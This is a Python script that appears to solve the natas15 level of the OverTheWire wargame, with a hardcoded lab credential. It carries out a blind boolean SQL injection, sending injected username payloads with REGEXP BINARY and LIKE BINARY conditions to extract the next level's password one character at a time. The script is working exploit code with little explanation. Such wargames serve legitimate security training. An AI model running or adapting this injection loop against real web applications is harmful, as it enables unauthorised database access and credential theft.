import requests
import string

target = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")  # Replace with natas15 password
password = ""
token="This user exists"
for i in range(len(password), 32):  # 32-character password
    chosen_chaset=string.ascii_letters
    # https://dev.mysql.com/doc/refman/8.0/en/regexp.html#regexp-compatibility
    # Prior to MySQL 8.0.22, it was possible to use binary string arguments with these functions, but they yielded inconsistent results.
    # In MySQL 8.0.22 and later, use of a binary string with any of the MySQL regular expression functions is rejected with ER_CHARACTER_SET_MISMATCH.
    # Regex defaults to match by case-insensitive, so must use REGEX BINARY
    # Due to the compatibility, CAST to BINARY is preferred
    test_data = {'username' : f'natas16" AND CAST(password AS BINARY) REGEXP BINARY "^{password}[[:alpha:]][[:alnum:]]*'}
    test_r = requests.post(target, test_data, auth=auth)
    if token in test_r.text:
        test_data = {'username' : f'natas16" AND CAST(password AS BINARY) REGEXP BINARY "^{password}[[:upper:]][[:alnum:]]*'}
        test_r = requests.post(target, test_data, auth=auth)
        chosen_chaset = string.ascii_uppercase if token in test_r.text else string.ascii_lowercase
    else:
        chosen_chaset = string.digits
    best = None
    for char in chosen_chaset:
        r = requests.post(target, auth=auth, data={'username': f'natas16" AND password LIKE BINARY "{password + char}%'})
        if token in r.text:
            best = char
            break
    if best is None:
        print("Error, last request received: ", r.text)
        break
    password += char
    print(f"Progress: {password.ljust(32, '*')}")

print(f"Final password: {password}")